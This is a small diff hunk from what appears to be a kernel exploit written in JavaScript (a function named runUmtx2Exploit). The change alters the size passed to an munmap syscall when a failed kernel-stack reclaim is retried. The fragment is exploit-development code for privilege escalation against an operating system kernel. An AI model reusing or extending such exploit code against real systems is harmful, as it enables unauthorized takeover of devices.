@@ -964,7 +964,7 @@ async function runUmtx2Exploit(p, chain, log = async () => { }) {
         if (closeRes != 0 || (kstack.low << 0) == -1) {
             await log("Failed to reclaim kstack. Retrying...", LogLevel.WARN);
             if (doInvalidKstackMunmap) {
-                await chain.syscall(SYS_MUNMAP, kstack, 0x4500);
+                await chain.syscall(SYS_MUNMAP, kstack, 0x4000);
             }
             kstack = null;
             continue;
